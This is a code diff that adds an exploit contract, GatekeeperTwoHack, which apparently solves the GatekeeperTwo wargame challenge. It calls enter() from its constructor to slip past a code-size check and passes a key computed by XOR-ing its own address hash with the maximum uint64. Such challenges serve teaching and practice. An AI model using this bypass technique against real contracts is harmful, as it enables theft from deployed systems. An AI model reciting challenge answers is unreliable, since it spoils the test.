@@ -30,10 +30,11 @@ contract GatekeeperTwo {
 
 contract GatekeeperTwoHack {
     GatekeeperTwo public curGatekeeperTwo;
+    bytes8 gateKey;
 
     constructor(address GatekeeperTwoAdr) {
         curGatekeeperTwo = GatekeeperTwo(GatekeeperTwoAdr);
+        gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+        curGatekeeperTwo.enter(gateKey);
     }
-
-    
 }
